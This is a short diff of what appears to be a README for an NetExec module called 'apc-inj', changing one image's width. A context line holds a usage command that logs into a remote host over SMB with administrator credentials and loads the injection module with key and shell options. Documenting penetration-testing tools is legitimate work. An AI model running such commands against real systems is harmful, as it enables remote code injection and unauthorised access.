@@ -31,7 +31,7 @@ nxc smb 192.168.1.100 -u Administrator -p Password -M apc-inj -o KEY=key123 SHEL
 
 ```
 
-<img src="example/nxcmodule.png" alt="file" width="600"/>
+<img src="example/nxcmodule.png" alt="file" width="800"/>
 <img src="example/listener.png" alt="file" width="600"/>
 
 ## Behind the scene
